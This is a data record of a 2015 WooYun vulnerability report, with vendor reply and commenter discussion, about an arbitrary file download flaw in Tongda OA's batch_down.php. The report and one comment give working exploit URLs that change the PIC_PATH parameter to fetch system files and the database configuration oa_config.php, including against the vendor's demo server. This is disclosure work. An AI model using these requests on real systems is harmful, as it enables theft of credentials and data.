{"id": 79687, "wybug_id": "wooyun-2015-0157564", "wybug_title": "通达OA任意文件下载漏洞", "wybug_corp": "通达信科", "wybug_author": "list", "wybug_date": "2015-12-03 17:13", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件下载", "通达", "系统文件"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-06：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2016-01-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 通达OA任意版本任意文件下载漏洞，可以下载电脑上任意文件。官网最新版作演示： 详细说明：  正常下载图片：http://**.**.**.**/general/picture/batch_down.php?TmpFileNameStr=DSCN0292.jpg|@~@&SUB_DIR=&PIC_PATH=d:/myoa/%D4%B1%B9%A4%BB%EE%B6%AF\n\n\n\n\n\n修改路径下载文件：下载index.php：http://**.**.**.**/general/picture/batch_down.php?TmpFileNameStr=index.php|@~@&SUB_DIR=&PIC_PATH=d:/myoa/webroot\n\n\n\n\n\n下载cmd.exe：http://**.**.**.**/general/picture/batch_down.php?TmpFileNameStr=cmd.exe|@~@&SUB_DIR=&PIC_PATH=c:/windows/system32\n\n\n\n   漏洞证明：  如上。   修复方案：  无。   版权声明：转载请注明来源 list@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2015-12-03 17:17 厂商回复： 需要知道文件名和路径。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-04 02:52 |    \t\tlist \t\t\t( 实习白帽子  |\t\t\t        Rank:68 漏洞数:13        )\t\t \n  对厂商给分有异议。什么叫做要知道文件名和路径。你们这玩意儿安装个不就可以看路径么？看我下载你们数据库配置文件：http://oa.tongda2000.com/general/picture/batch_down.php?TmpFileNameStr=oa_config.php|@~@&SUB_DIR=&PIC_PATH=d:/myoa/webroot/inc/下载数据库：http://oa.tongda2000.com/general/picture/batch_down.php?TmpFileNameStr=user.frm|@~@&SUB_DIR=&PIC_PATH=d:/myoa/data5/TD_OA    \n     2015-12-07 21:57 |    \t\t幻老头儿 \t\t\t( 普通白帽子  |\t\t\t        Rank:220 漏洞数:50        | 新手上路。)\t\t \n  @list 需要登录吧？    \n     2015-12-08 16:08 |    \t\tlist \t\t\t( 实习白帽子  |\t\t\t        Rank:68 漏洞数:13        )\t\t \n  @幻老头儿  如果不能下就需要登录。    \n     2015-12-08 16:23 |    \t\t幻老头儿 \t\t\t( 普通白帽子  |\t\t\t        Rank:220 漏洞数:50        | 新手上路。)\t\t \n  @list 我看源码中是有session验证的。哈哈    \n     2015-12-08 16:23 |    \t\t幻老头儿 \t\t\t( 普通白帽子  |\t\t\t        Rank:220 漏洞数:50        | 新手上路。)\t\t \n  @list 如果可以绕过session，那就为所欲为了。    \n     2015-12-28 17:27 |    \t\t独角兽 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:6        | 无)\t\t \n  确实存在，不过user.frm下载后无法正常读取，本地搭建覆盖，单独调用。均失败！    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}